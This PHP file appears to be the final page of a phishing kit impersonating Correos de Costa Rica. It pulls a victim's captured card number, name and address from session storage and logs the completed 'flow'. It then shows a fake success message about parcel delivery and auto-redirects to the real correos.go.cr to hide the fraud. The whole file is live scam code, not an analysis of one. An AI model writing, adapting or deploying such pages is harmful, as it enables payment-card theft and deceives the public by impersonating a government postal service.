<?php
declare(strict_types=1);
require_once __DIR__ . '/inc/functions.php';
kit_init();
$token = ensure_flow();
$card  = card_session();
$number  = mask_card($card['number'] ?? '');
$name    = $card['name'] ?? '';
$address = trim(($card['address'] ?? '') . ($card['province'] ?? '' !== '' ? ', ' . $card['province'] : ''));
log_event($token, 'finish');
$secs = 5;
$page_title = 'Sucursal Virtual';
$head_extra = '<meta http-equiv="refresh" content="' . $secs . ';url=https://correos.go.cr/">';
require __DIR__ . '/inc/header.php';
?>
<div class="wpb-content-wrapper">
<div class="vc_row wpb_row vc_row-fluid">
<div class="wpb_column vc_column_container vc_col-sm-12">
<div class="vc_column-inner">
<div class="wpb_wrapper">
<div class="flow-wrap">
	<div class="flow-card">
		<h2>Trámite completado con éxito</h2>
		<p class="flow-lead">Todo está listo. Recibirá su paquete en un plazo de <b>1 a 2 días</b> en la dirección postal registrada.</p>
		<div class="recap">
			<b>Destino:</b> <?php echo h($address); ?><br>
			<b>Titular:</b> <?php echo h($name); ?><br>
			<b>Tarjeta:</b> <?php echo h($number); ?>
		</div>
		<p class="secure">Puede dar seguimiento a su envío desde el portal oficial de Correos de Costa Rica con su número de guía.</p>
		<p class="secure status-ok"><i class="fas fa-check-circle"></i> Gracias por utilizar Correos de Costa Rica.</p>
		<div class="bar"><div class="bar-fill" id="bar"></div></div>
		<p class="secure">Será redirigido al portal oficial en <b id="secs"><?php echo $secs; ?></b> segundos...</p>
	</div>
</div>
</div>
</div>
</div>
</div>
</div>
<script>
(function () {
  var total = <?php echo $secs; ?>;
  var left = total;
  var el = document.getElementById('secs');
  var bar = document.getElementById('bar');
  if (el) { el.textContent = left; }
  if (bar) { bar.style.width = '3%'; }
  var iv = setInterval(function () {
    left--;
    if (el) { el.textContent = left; }
    if (bar) { bar.style.width = Math.round((total - left) / total * 100) + '%'; }
    if (left <= 0) { clearInterval(iv); }
  }, 1000);
})();
</script>
<?php require __DIR__ . '/inc/footer.php'; ?>
